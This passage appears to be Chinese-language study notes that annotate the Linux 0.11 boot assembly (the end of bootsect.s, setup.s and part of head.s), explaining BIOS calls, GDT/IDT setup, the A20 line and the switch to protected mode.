ax,bx shr ax,#9 ok2_read: call read_track mov cx,ax add ax,sread seg cs cmp ax,sectors jne ok3_read mov ax,#1 sub ax,head jne ok4_read inc track ok4_read: mov head,ax xor ax,ax ok3_read: mov sread,ax shl cx,#9 add bx,cx jnc rp_read mov ax,es add ax,#0x1000 mov es,ax xor bx,bx jmp rp_read read_track: push ax push bx push cx push dx mov dx,track mov cx,sread inc cx mov ch,dl mov dx,head mov dh,dl mov dl,#0 and dx,#0x0100 mov ah,#2 int 0x13 jc bad_rt pop dx pop cx pop bx pop ax ret bad_rt:\tmov ax,#0 mov dx,#0 int 0x13 pop dx pop cx pop bx pop ax jmp read_track /* * This procedure turns off the floppy drive motor, so * that we enter the kernel in a known state, and * don\u0026#39;t have to worry about it later. */ ; 这个程序用于关闭软件马达，这样进入内核就可以知道它所处的状态 kill_motor: push dx mov dx,#0x3f2 !软件控制卡的数字输出寄存器(DOR)端口，只写 mov al,#0 outb pop dx ret sectors: .word 0 msg1: ! 调用BIOS中断显示信息 .byte 13,10 ! 回车换行的ascii码 .ascii \u0026#34;Loading system ...\u0026#34; ！ 显示字符串 .byte 13,10,13,10 ！一个24个字符 ; 表示下面语句从地址508(0x1fc)开始，所以root_dev在启动扇区的第508开始的2个字节中 .org 508 root_dev: .word ROOT_DEV ！存放根文件系统所在设备号(init/main.c中会用) ; 下面是启动盘具有有效引导扇区的标志，在BIOS程序加载引导扇区时识别使用， ; 它必须位于引导扇区的最后两个字节中 boot_flag: .word 0xAA55 .text endtext: .data enddata: .bss endbss: 操作系统加载\u0026mdash;setup 1.简介 作用：setup.s是操作系统加载程序，它的作用是利用ROM BIOS中断读取系统数据，并将这些数据保存到0x90000开始的位置处(覆盖了原来bootsect程序所在的地方)\n读取到数据保存的位置: 将读取到的数据保存后，==setup将system模块从0x10000-0x8ffff整块移动到内存绝对地址0x00000处==。 然后加载中断描述符表寄存器(idir)和全局描述符表寄存器(gdtr)，开启A20地址线，重新设置两个中断控制芯片8259A，将硬件中断号重新设置为0x20-0x2f。再设置cpu的控制寄存器CR0(机器状态字)，从而进入32位保护模式，并跳到system模块最前面部分的head.s程序继续运行。\n为了能让head.s在32位保护模式下运行，在程序中临时设置中断描述符(IDT)和全局描述符表(GDT)，并在GDT中设置当前内核代码段的描述符和数据段的描述符。\nGDT 段描述符存放在描述符表中。描述符表其实就是内存中描述符项的一个阵列。\n描述符表有两类：全局描述符表(Global descriptor table-GDT)和局部描述符表(Local descriptor table−LDT)。\n处理器是通过使用GDTR和LDTR寄存器来定位GDT表和当前的LDT表。\n这两个寄存器以线性地址的方式保存了描述符表的基地址和表的长度。\n指令Igd和sgd用于访问GDTR寄存器； 指令Hdt和slut用于访问LDTR寄存器。 lgd使用内存中一个6字节操作数来加载GDTR寄存器。头两个字节代表描述符表的长度，后4个字节是描述符表的基地址。但，访问LDTR寄存器的指令lut所使用的操作数却是一个2字节的操作数，表示全局描述符表GDT中一个描述符项的选择符。该选择符所对应的GDT表中的描述符项应该对应一个局部描述符表。\nsetup设置的GDT描述符项，代码段描述符的值是0x00C09A0000007FF,\n表示代码段的限长是 8MB(=(0x7F+1)∗4KB, 这里加1是因为限长值是从0开始算起的，段在线性地址空间中的基址是0，段类型值009A表示该段存在于内存中、段的特权级别为0、段类型是可读可执行的代码段，段代码是32位的并且段的颗粒度是4KB。\n数据段描述符的值是0x00C0920000007FF，表示数据段的限长是8MB…段在线性地址空间中的基址是0。段类型值0x92表示该段存在于内存中、段的特权级别为0、段类型是可读可写的数据段、段代码是32位的并且段的颗粒度是4KB。\n逻辑地址的选择符部分用于指定一描述符，它是通过指定一描述符表并且索引其中的一个描述符项完成的。\n段选择符格式：\n其中索引值用于指定描述符表中8192(2**13)个描述符中的一个。\n处理器将该索引值乘上8，并加上描述符表的基地址即可访问表中指定的段描述符。\n表指示器(Table Indicator - TD)用于指定选择符所引用的描述符表。值为0表示指定GDT表，值为1表示指定当前的LDT表。请求者特权级（R capaestor’sPrivalege Level-RPL)用于保护机制。\n由于GDT表的第一项(索引值为0)没有被使用，因此一个具有索引值0和表指示器值也为0的选择符(也即指向GDT的第一项的选择符)可以用作为一个空(null)选择符。当一个段寄存器(不能是 CS或SS)加载了一个空选择符时，处理器并不会产生一个异常。但是若使用这个段寄存器访问内存时就会产生一个异常。对于初始化还未使用的段寄存器以陷入意外的引用来说，这个特性是很有用的。\n在进入保护模式之前，我们必须首先设置好将要用到的段描述符表，例如全局描述符表GDT。然后使用指令lgdt把描述符表的基地址告知CPU(GDT表的基地址存入g知寄存器)。再将机器状态字的保护模式标志置位即可进入32位保护运行模式。\nLinux 0.11硬盘设备号\n在Linux中，硬盘的主区号是3，其他设备的主设备号分别为：\n1–内存 2–磁盘 3–硬盘 4–ttyx 5–tty 6–并行口 7–非命名管道\n一个硬盘可以有1-4个分区，可以依据分区的不同用次设备号进行指定分区，所以：设备号=主设备号*256+次设备号\n磁盘\n一个磁盘由多个盘片（如下图中的 0 号盘片）叠加而成。盘片的表面涂有磁性物质，这些磁性物质用来记录二进制数据。因为正反两面都可涂上磁性物质，故一个盘片可能会有两个盘面\n每个盘片被划分为一个个磁道，每个磁道又划分为一个个扇区\n柱面\n每个盘面对应一个磁头。所有的磁头都是连在同一个磁臂上的，因此所有磁头只能“共进退”。所有盘面中相对位置相同的磁道组成柱面\n磁盘的物理地址\n可用（柱面号，盘面号，扇区号）来定位任意一个“磁盘块”\n可根据该地址读取一个“块”，操作如下：\n① 根据“柱面号”移动磁臂，让磁头指向指定柱面；\n② 激活指定盘面对应的磁头；\n③ 磁盘旋转的过程中，指定的扇区会从磁头下面划过，这样就完成了对指定扇区的读/写\n2.源码分析 1.setup完成OS前的初始化和设置\n1)保存光标的位置 2)得到扩展内存的大小 3)得到显示卡当前的显示模式 4)检测显示方式 5)读取硬盘参数表信息\n硬盘基本参数表(INT 0x41)\n在中断向量表中，int 0x41的中断向量位置（4*0x41=0x0000:0x0140）存放的不是中断程序的地址入口，而是第一个硬盘参数表的信息，0x46存放第二个硬盘参数表\n硬盘参数表信息：\n2.将整个system模块移动到0x00000处\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ; bootsect引导程序将system模块移动到(0x10000)处， ; 并把自己移动到(0x90000)处，把setup加载在它后面 ; 下面这段程序将整个system模块移动到0x00000处， ; 即把从0x10000到0x8ffff的内存数据块整块的向内存地址低端移动了0x10000的位置 mov\tax,#0x0000 cld\t! \u0026#39;direction\u0026#39;=0, movs moves forward do_move: mov\tes,ax\t! destination segment add\tax,#0x1000 cmp\tax,#0x9000 ! 判断代码是否移动完成 jz\tend_move ! 移动完成则跳转 mov\tds,ax\t! source segment sub\tdi,di sub\tsi,si mov cx,#0x8000 ! 循环移动，循环次数，每次循环完次数减 移动0x8000字 rep\t! 用于把内容从ds:si 复制es:di 以字节单位 movsw ! rep是repeat，rep配合 movw(movsb) 就是多次复制直到cx=0为止 复制的次数放在cx中 jmp\tdo_move 移动后内存存放数据：\n3.跳转到绝对地址0x00000处\n在跳转之前还要进行相应的设置\n1)加载段描述符，设置全局描述符表和中断描述表 2)开启A20地址线，为了能够访问和使用1MB以上的物理内存 3)重新对中断进行编程\n进入保护模式：jmpi 0,8\n1 2 3 4 5 6 7 ;进入保护模式，只是跳转到绝对地址0x00000处 ; 加载机器状态字(控制寄存器CR0)，将0位置1，CPU切换到保护模式 mov\tax,#0x0001\t! protected mode (PE) bit 保护模式比特位(PE) lmsw\tax\t! This is it! 加载状态寄存器 ;段选择符8表示请求特权0级，使用GDT第二个段描述符 jmpi\t0,8\t! jmp offset 0 of segment 8 (cs) 跳转至cs段偏移地址位0处(system已经移动到0x00000处) setup程序完整代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 ! !\tsetup.s\t(C) 1991 Linus Torvalds ! ! setup.s is responsible for getting the system data from the BIOS, ! and putting them into the appropriate places in system memory. ! both setup.s and system has been loaded by the bootblock. ! ! This code asks the bios for memory/disk/other parameters, and ! puts them in a \u0026#34;safe\u0026#34; place: 0x90000-0x901FF, ie where the ! boot-block used to be. It is then up to the protected mode ! system to read them from there before the area is overwritten ! for buffer-blocks. ! ; setup从BIOS中获取数据，并将这些数据保存到0x90000开始的位置处(0x90000-0x901FF覆盖了原来bootsect程序所在的地方) ; 此时setup和system已经由bootsect引导块加载到内存中 ; ! NOTE! These had better be the same as in bootsect.s! INITSEG = 0x9000\t! we move boot here - out of the way 原来bootsect所在段 SYSSEG = 0x1000\t! system loaded at 0x10000 (65536). system所在0x10000处 SETUPSEG = 0x9020\t! this is the current segment 本程序所在段地址 .globl begtext, begdata, begbss, endtext, enddata, endbss .text begtext: .data begdata: .bss begbss: .text entry start start: ! ok, the read went well so we get current cursor position and save it for ! posterity. ; 保存光标的位置 ; 使用BIOS中断取屏幕当前光标的位置(列，行)，保存到内存(0x90000)处,2个byte ; 控制台初始化程序会到此处读取该值 ; BISO 中断0x10 功能号 ah = 0x30 ，读光标的位置 ; 输入：bh=页号 ; 返回：返回：ch = 扫描开始线，cl = 结束开始线,dh = 行号(0x00顶端)，dl=列号(0x00最左边) mov\tax,#INITSEG ! this is done in bootsect already, but... mov\tds,ax mov\tah,#0x03\t! read cursor pos 功能号 ah = 0x30 ，读光标的位置 xor\tbh,bh int\t0x10\t! save it in known place, con_init fetches mov\t[0],dx\t! it from 0x90000. 将ds设置成0x90000(INITSEG) ! Get memory size (extended mem, kB) ; 得到扩展内存的大小 ; 利用BIOS中断0x15 功能号 ah= 0x88取系统所含扩展内存大小并保存到0x90002处 ; 返回： ax= 0x10000(1M)处开始的扩展内存大小，若出错CF置位，ax=出错码 mov\tah,#0x88 int\t0x15 mov\t[2],ax !扩展内存的大小保存到0x90002处 ! Get video-card data: ; 得到显示卡当前的显示模式 ; 调用BIOS中断0x10，功能号 ah = 0x0f ; 返回：ah=字符列数，al=显示模式，bh=显示当前页数 mov\tah,#0x0f int\t0x10 mov\t[4],bx\t! bh = display page mov\t[6],ax\t! al = video mode, ah = window width ! check for EGA/VGA and some config parameters ; 检测显示方式 ; 调用BIOS中断0x10, 功能号 ah=0x12,bl=0x10 mov\tah,#0x12 mov\tbl,#0x10 int\t0x10 mov\t[8],ax ! 0x90008 =ax mov\t[10],bx ! 0x9000A = 安装的显示内存，0x9000B = 显示状态 mov\t[12],cx\t！0X9000C = 显卡特性参数 ! Get hd0 data ; 取第一个硬盘信息 ; 第一个硬盘参数表的首地址是中断向量0x41的向量值 ; 第二个紧跟着对应着中断向量0x46 ; 下面两个程序分别复制BIOS有关硬盘参数表， ; 第一个硬盘存放在0x90080,第二个硬盘存放在0x90090 mov\tax,#0x0000 mov\tds,ax lds\tsi,[4*0x41] !取中断向量0x41对应的地址 ，hd0参数表的地址--\u0026gt; ds:si mov\tax,#INITSEG mov\tes,ax mov\tdi,#0x0080 ！传输的目的地址(0x9000:0x0080) --\u0026gt;es:di mov\tcx,#0x10 ! 循环次数，每次循环完次数减一，共传输16个字节 rep\t! rep是repeat，rep配合 movw(movsb) 就是多次复制直到cx=0为止 复制的次数放在cx中 movsb ! 用于把内容从ds:si 复制es:di 以字节单位 ! Get hd1 data mov\tax,#0x0000 mov\tds,ax lds\tsi,[4*0x46] !取中断向量0x41对应的地址 ，hd0参数表的地址--\u0026gt; ds:si mov\tax,#INITSEG mov\tes,ax mov\tdi,#0x0090 mov\tcx,#0x10 rep movsb ! Check that there IS a hd1 :-) ; 检测是否有第二个硬盘，如果没有则把第2个清零 ; 利用BIOS中断调用0x13的取盘的类型，功能号 ah =0x15 mov\tax,#0x01500 mov\tdl,#0x81 ! dl = 驱动器号(0x8X是硬盘，0x81是第一个硬盘，0x82是第二个硬盘) int\t0x13 jc\tno_disk1 ! 第二个不存在 cmp\tah,#3\t! ah =类型码 指硬盘 je\tis_disk1 ! 存在 ; 第二个硬盘不存在，对第二个硬盘表清零 no_disk1: mov\tax,#INITSEG mov\tes,ax mov\tdi,#0x0090 mov\tcx,#0x10 mov\tax,#0x00 rep stosb ; 第二个硬盘存在，进入保护模式，从此开始不允许中段 is_disk1: ! now we want to move to protected mode ... cli\t! no interrupts allowed ! ! first we move the system to it\u0026#39;s rightful place ; bootsect引导程序将system模块移动到(0x10000)处， ; 并把自己移动到(0x90000)处，把setup加载在它后面 ; 下面这段程序将整个system模块移动到0x00000处， ; 即把从0x10000到0x8ffff的内存数据块整块的向内存地址低端移动了0x10000的位置 mov\tax,#0x0000 cld\t! \u0026#39;direction\u0026#39;=0, movs moves forward do_move: mov\tes,ax\t! destination segment add\tax,#0x1000 cmp\tax,#0x9000 ! 判断代码是否移动完成 jz\tend_move ! 移动完成则跳转 mov\tds,ax\t! source segment sub\tdi,di sub\tsi,si mov cx,#0x8000 ! 循环移动，循环次数，每次循环完次数减 移动0x8000字 rep\t! 用于把内容从ds:si 复制es:di 以字节单位 movsw ! rep是repeat，rep配合 movw(movsb) 就是多次复制直到cx=0为止 复制的次数放在cx中 jmp\tdo_move ! then we load the segment descriptors ; 加载段描述符，设置全局描述符表和中断描述表 end_move: mov\tax,#SETUPSEG\t! right, forgot this at first. didn\u0026#39;t work :-) mov\tds,ax ; lidt指令用于加载中断描述符表(IDT)寄存器 ; 中断描述符表中每一个8个字节对应每个中断发生时所需要的中断程序地址入口 lidt\tidt_48\t! load idt with 0,0 ; lgdt指令用于加载全局描述符表(GDT)寄存器 ; 全局描述符表中每个描述符项(8字节)描述了保护模式下数据段和代码段的信息 lgdt\tgdt_48\t! load gdt with whatever appropriate ! that was painless, now we enable A20 ; 开启A20地址线，为了能够访问和使用1MB以上的物理内存 call\tempty_8042 ! 测试8042状态寄存器，等待输入缓冲器空， mov\tal,#0xD1\t! command write 0xD1命令码表示写数据到8042的P2端口 out\t#0x64,al call\tempty_8042 ！等待输入缓冲器空，看命令是否被接受 mov\tal,#0xDF\t! A20 on out\t#0x60,al call\tempty_8042 ！若此时输入缓冲器为空，则表示A20线也选通 ! well, that went ok, I hope. Now we have to reprogram the interrupts :-( ! we put them right after the intel-reserved hardware interrupts, at ! int 0x20-0x2F. There they won\u0026#39;t mess up anything. Sadly IBM really ! messed this up with the original PC, and they haven\u0026#39;t been able to ! rectify it afterwards. Thus the bios puts interrupts at 0x08-0x0f, ! which is used for the internal hardware interrupts as well. We just ! have to reprogram the 8259\u0026#39;s, and it isn\u0026#39;t fun. ; 重新对中断进行编程 mov\tal,#0x11\t! initialization sequence out\t#0x20,al\t! send it to 8259A-1 发送到8259A主芯片 ; 0x00eb直接使用机器码表示两条相对跳转指令，起延时作用 .word\t0x00eb,0x00eb\t! jmp $+2, jmp $+2 out\t#0xA0,al\t! and to 8259A-2 再发送到8259A从芯片 .word\t0x00eb,0x00eb ; 系统硬件中断号被设置成0x20开始 mov\tal,#0x20\t! start of hardware int\u0026#39;s (0x20) out\t#0x21,al\t！送主芯片ICW2命令字，设置起始中断，要送奇端口 .word\t0x00eb,0x00eb mov\tal,#0x28\t! start of hardware int\u0026#39;s 2 (0x28) out\t#0xA1,al ！送主芯片ICW2命令字，从芯片的起始中断号 .word\t0x00eb,0x00eb mov\tal,#0x04\t! 8259-1 is master out\t#0x21,al !ICW3 .word\t0x00eb,0x00eb mov\tal,#0x02\t! 8259-2 is slave out\t#0xA1,al .word\t0x00eb,0x00eb mov\tal,#0x01\t! 8086 mode for both out\t#0x21,al .word\t0x00eb,0x00eb out\t#0xA1,al .word\t0x00eb,0x00eb mov\tal,#0xFF\t! mask off all interrupts for now out\t#0x21,al .word\t0x00eb,0x00eb out\t#0xA1,al ! well, that certainly wasn\u0026#39;t fun :-(. Hopefully it works, and we don\u0026#39;t ! need no steenking BIOS anyway (except for the initial loading :-). ! The BIOS-routine wants lots of unnecessary data, and it\u0026#39;s less ! \u0026#34;interesting\u0026#34; anyway. This is how REAL programmers do it. ! ! Well, now\u0026#39;s the time to actually move into protected mode. To make ! things as simple as possible, we do no register set-up or anything, ! we let the gnu-compiled 32-bit programs do that. We just jump to ! absolute address 0x00000, in 32-bit protected mode. ; 进入保护模式，只是跳转到绝对地址0x00000处 ; 加载机器状态字(控制寄存器CR0)，将0位置1，CPU切换到保护模式 mov\tax,#0x0001\t! protected mode (PE) bit 保护模式比特位(PE) lmsw\tax\t! This is it! 加载状态寄存器 ;段选择符8表示请求特权0级，使用GDT第二个段描述符 jmpi\t0,8\t! jmp offset 0 of segment 8 (cs) 跳转至cs段偏移地址位0处(system已经移动到0x00000处) ! This routine checks that the keyboard command queue is empty ! No timeout is used - if this hangs there is something wrong with ! the machine, and we probably couldn\u0026#39;t proceed anyway. ; 检差键盘命令队列是否为空 ; 只有当输入缓冲器为空(键盘控制器状态寄存器位1 = 0)才可以进行写命令 empty_8042: .word\t0x00eb,0x00eb ！延时作用 in\tal,#0x64\t! 8042 status port test\tal,#2\t! is input buffer full? jnz\tempty_8042\t! yes - loop ret ; GDT全局描述符表开始处，描述符表由多个8字节长的描述符项组成, ; 3个描述符项 ; 第一项没有作用，但是必须存在 ; 第二项是系统代码段描述符 ; 第三项是系统数据段描述符 gdt: .word\t0,0,0,0\t! dummy 第一个描述符 不用 ; 在GDT表这里的偏移量是0x80,它是内核代码段选择符的值 .word\t0x07FF\t! 8Mb - limit=2047 (2048*4096=8Mb) .word\t0x0000\t! base address=0 .word\t0x9A00\t! code read/exec .word\t0x00C0\t! granularity=4096, 386 ; 在GDT表这里的偏移量是0x10,它是内核数据段选择符的值 .word\t0x07FF\t! 8Mb - limit=2047 (2048*4096=8Mb) .word\t0x0000\t! base address=0 .word\t0x9200\t! data read/write .word\t0x00C0\t! granularity=4096, 386 ; 加载中断描述符表寄存器(idtr) ; 这里设置一个长度为0的空表 idt_48: .word\t0\t! idt limit=0 .word\t0,0\t! idt base=0L ; 加载全局描述符表寄存器(gdtr) ; GDT表长度为2kb gdt_48: .word\t0x800\t! gdt limit=2048, 256 GDT entries .word\t512+gdt,0x9\t! gdt base = 0X9xxxx .text endtext: .data enddata: .bss endbss: 内核引导程序\u0026mdash;head 1.简介 head.s 程序在被编译生成目标文件后会与内核其他程序一起被链接成 system 模块，它位于 system 模块的最开始部分。system模块将被放置在磁盘上setup模块之后的扇区，从磁盘上第6个扇区开始放置。\n注：这段程序处于绝对地址0x00000处。\n程序进入保护模式，程序采用AT\u0026amp;T语法格式。\nLinux AT\u0026amp;T汇编语法简介：\n添加链接描述\n作用：head.s程序：设置中断描述符表项（哑中断）；检查A20；测试是否有协处理器；初始化内存页目录表；跳转到main.c执行内核初始化\nhead完成后完成了内存页目录和页表的设置，并重新设置了内核实际使用的中断描述符表idt和全局描述符表GDT,还为软盘驱动程序开辟了1KB字节的缓冲区。\n32位下寻址\n将实模式下的段寄存器当作保护模式下的段描述符的指针使用，此时段寄存器中存放的是一个描述符在描述符表中的偏移地址寄存器，而当前描述符表的基地址则保存在描述符表寄存器中。\nhead程序结束后内存映像\n.align\n1 2 3 4 5 .align 2 完整格式 ：.align val1,val2,val3 val1 是需要对齐的值 val2 填充字节指定的值 val3 指明最大用于填充或跳过的直接数 .align是汇编语言指示符。其含义是边界对齐调整。”2”表示把随后的代码或数据的偏移位置调整到地址值最后 2 比特位为零的位置，即按 4（=2^2）字节方式对齐内存地址。不过现在 GNU as 直接写出对齐的值而非 2 的幂次。使用该指示符的目的是为了提高 32 位 CPU 访问内存中代码或数据的效率。\n.ORG\nORG伪指令用来表示起始的偏移地址，紧接着ORG的数值就是偏移地址的起始值。ORG伪操作常用来指定数据的存储地址，有时也用来指定代码段的起始地址\nfill\nfill伪指令的格式是 .fill repeat,size,value\n表示产生 repeat 个大小为 size 字节的重复拷贝。size 最大是 8，size 字节的值是 value.\n按位异或 xor\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 1. 使某些特定的位翻转 例如要使 EAX 的 b1 位和 b2 位翻转： EAX = EAX ^ 00000110 2.不使用临时变量就可以实现两个值的交换 例如 a=11110000，b=00001111，要交换a、b的值 a = a^b； //a=11111111 b = b^a； //b=11110000 a = a^b； //a=00001111 3.在汇编语言中经常用于将变量置零 xor eax，eax 4.快速判断两个值是否相等 例如判断两个整数a、b是否相等，可通过下列语句实现： return ((a ^ b) == 0)； LSS指令\n1 2 3 格式：LSS r32,m16:32 #用内存中的长指针加载 SS:r32 m16:32表示一个内存操作数，这个操作数是一个长指针，由2部分组成：16位的段选择 子和32位的偏移。 2.源码分析 1.启动32位程序\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 startup_32: movl $0x10,%eax ;0x10 GDT中的偏移值(一个描述符表项的选择符) ;请求特级权0(位0-1 =0)，GDT(位2=0)，选择表中第2项(位3-15=2) ; 正好指向数据段描述符项 mov %ax,%ds ; 设置ds,es,fs,gs为setup中构造的数据段的选择符 =0x10 mov %ax,%es\t;并将堆栈放置在stack_start(指针)指向的user_stack数组区 mov %ax,%fs mov %ax,%gs lss _stack_start,%esp ;_stack_start--\u0026gt;ss:esp,设置系统堆栈 ;移动到任务0执行(init/main.c)，该栈就被用做任务0和任务1共同使用的用户栈 call setup_idt ; 调用设置中断描述符表子程序 call setup_gdt ; 调用设置全局描述符表子程序 movl $0x10,%eax\t# reload all the segment registers mov %ax,%ds\t# after changing gdt. CS was already mov %ax,%es\t# reloaded in \u0026#39;setup_gdt\u0026#39; mov %ax,%fs\t# 因为修改了gdt,所以重新加载这些寄存器 mov %ax,%gs 2.加载各个段寄存器，重新设置中断描述符表，共256项，并使各个表项均指向一个只报错误的哑中断程序，重新设置全局描述符表\n1)IDT:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ;设置中断描述符表(IDT)字程序setup_idt ; 将中断描述符表设置具有256个项，并都指向ignore_int中断门，然后加载中断描述符表寄存器 ; 中断描述符表中的项为8个字节，称为门描述符 setup_idt: lea ignore_int,%edx # 将ignore_int有效地址值赋值给edx movl $0x00080000,%eax # 将选择符0x0008赋值给eax的高16位 movw %dx,%ax\t/* selector = 0x0008 = cs */ movw $0x8E00,%dx\t/* interrupt gate - dpl=0, present */ lea _idt,%edi # _idt 是中断描述符表的地址 mov $256,%ecx rp_sidt: movl %eax,(%edi)\t# eax -\u0026gt; [edi] 将哑中断门描述符存入表中 movl %edx,4(%edi) # edx -\u0026gt; [edi+4] addl $8,%edi\t# edi + 8 -\u0026gt; edi dec %ecx jne rp_sidt lidt idt_descr #加载中断描述符表寄存器 ret 2)GDT\n1 2 3 4 # 设置全局描述符表项 setup_gdt: lgdt gdt_descr # 加载全局描述符寄存器 ret 3.对比物理地址0与1M开始处的内容是否相同，如果相同那么没有开启A20地址线，进入死循环\n1 2 3 4 5 6 7 8 9 10 11 12 13 ;测试A20地址线是否开启 ;方法：向内存地址0处写入任意一个数值，看内存地址是否是这个数值 ;如果是就一直比较下去，产生死循环， ;表示A20线没有选通，内核就不能使用1MB以后的内存空间 xorl %eax,%eax 1:\tincl %eax\t# check that A20 really IS enabled # 1--\u0026gt;标号，表示活动位置计数的当前值，并可以作为指令的操作数 movl %eax,0x000000\t# loop forever if it isn\u0026#39;t cmpl %eax,0x100000 je 1b # Nb:引用先前最近的标号 \u0026#39;b\u0026#39;:backwards 向后 # Nf:引用下一个标号 \u0026#39;f\u0026#39;:forwards 向前 # 这里‘1b’表示：向后跳转到标号1去 # 如果是5f,则是向前跳转到标号5去 4.测试PC机是否含有数据协处理器芯片，并在控制寄存器CR0中设置相应的标志位\n1 2 3 4 5 6 7 8 9 10 ; 检测486数学协处理器芯片是否存在 ; 方法：修改控制寄存器CR0，然后执行一条协处理器指令，若出错，则不存咋 ; 需要设置协处理器仿真位(EM)位2,并复位协处理器存在标志(MP)位2 movl %cr0,%eax\t# check math chip andl $0x80000011,%eax\t# Save PG,PE,ET /* \u0026#34;orl $0x10020,%eax\u0026#34; here for 486 might be good */ orl $2,%eax\t# set MP 并复位协处理器存在标志(MP) movl %eax,%cr0 call check_x87 jmp after_page_tables 5.设置管理内存的分页处理机制，将页目录表放在绝对物理地址0开始处紧随其后放置共可寻址16MB内存的4个页表，并分别设置它们的表项\n6.最后利用返回指令将预先放置在堆栈中的/init/main.c程序的入口地址弹出，运行main()程序\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 下面几个入栈操作为了跳转到init/main.c中main()函数做准备 # 前面三个入栈0值分别表示envp,argv指针和argc的值 after_page_tables: pushl $0\t# These are the parameters to main :-) main函数参数 envp pushl $0\t# argv指针 pushl $0\t# argc pushl $L6\t# return address for main, if it decides to. 模拟调用main时首先将返回地址入栈的操作 pushl $_main # _main---\u0026gt;main jmp setup_paging # main函数到不了这里 ，到标号L6这里，是一个死循环 L6: jmp L6\t# main should never return here, but # just in case, we know what happens. 3.head完整源码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 /* * linux/boot/head.s * * (C) 1991 Linus Torvalds */ /* * head.s contains the 32-bit startup code. * * NOTE!!! Startup happens at absolute address 0x00000000, which is also where * the page directory will exist. The startup code will be overwritten by * the page directory. */ ; head程序含有32启动程序代码 ; 32启动程序代码是从绝对地址0x00000处开始 ; 页目录也在该内存，以后启动代码将会被覆盖 .text .globl _idt,_gdt,_pg_dir,_tmp_floppy_area _pg_dir: ; 页目录将会放在在这里 startup_32: movl $0x10,%eax ;0x10 GDT中的偏移值(一个描述符表项的选择符) ;请求特级权0(位0-1 =0)，GDT(位2=0)，选择表中第2项(位3-15=2) ; 正好指向数据段描述符项 mov %ax,%ds ; 设置ds,es,fs,gs为setup中构造的数据段的选择符 =0x10 mov %ax,%es\t;并将堆栈放置在stack_start(指针)指向的user_stack数组区 mov %ax,%fs mov %ax,%gs lss _stack_start,%esp ;_stack_start--\u0026gt;ss:esp,设置系统堆栈 ;移动到任务0执行(init/main.c)，该栈就被用做任务0和任务1共同使用的用户栈 call setup_idt ; 调用设置中断描述符表子程序 call setup_gdt ; 调用设置全局描述符表子程序 movl $0x10,%eax\t# reload all the segment registers mov %ax,%ds\t# after changing gdt. CS was already mov %ax,%es\t# reloaded in \u0026#39;setup_gdt\u0026#39; mov %ax,%fs\t# 因为修改了gdt,所以重新加载这些寄存器 mov %ax,%gs lss _stack_start,%esp ;测试A20地址线是否开启 ;方法：向内存地址0处写入任意一个数值，看内存地址是否是这个数值 ;如果是就一直比较下去，产生死循环， ;表示A20线没有选通，内核就不能使用1MB以后的内存空间 xorl %eax,%eax 1:\tincl %eax\t# check that A20 really IS enabled # 1--\u0026gt;标号，表示活动位置计数的当前值，并可以作为指令的操作数 movl %eax,0x000000\t# loop forever if it isn\u0026#39;t cmpl %eax,0x100000 je 1b # Nb:引用先前最近的标号 \u0026#39;b\u0026#39;:backwards 向后 # Nf:引用下一个标号 \u0026#39;f\u0026#39;:forwards 向前 # 这里‘1b’表示：向后跳转到标号1去 # 如果是5f,则是向前跳转到标号5去 /* * NOTE! 486 should set bit 16, to check for write-protect in supervisor * mode. Then it would be unnecessary with the \u0026#34;verify_area()\u0026#34;-calls. * 486 users probably want to set the NE (#5) bit also, so as to use * int 16 for math errors. */ ; 检测486数学协处理器芯片是否存在 ; 方法：修改控制寄存器CR0，然后执行一条协处理器指令，若出错，则不存咋 ; 需要设置协处理器仿真位(EM)位2,并复位协处理器存在标志(MP)位2 movl %cr0,%eax\t# check math chip andl $0x80000011,%eax\t# Save PG,PE,ET /* \u0026#34;orl $0x10020,%eax\u0026#34; here for 486 might be good */ orl $2,%eax\t# set MP 并复位协处理器存在标志(MP) movl %eax,%cr0 call check_x87 jmp after_page_tables /* * We depend on ET to be correct. This checks for 287/387. */ ; fninit和fstsw是协处理器的指令 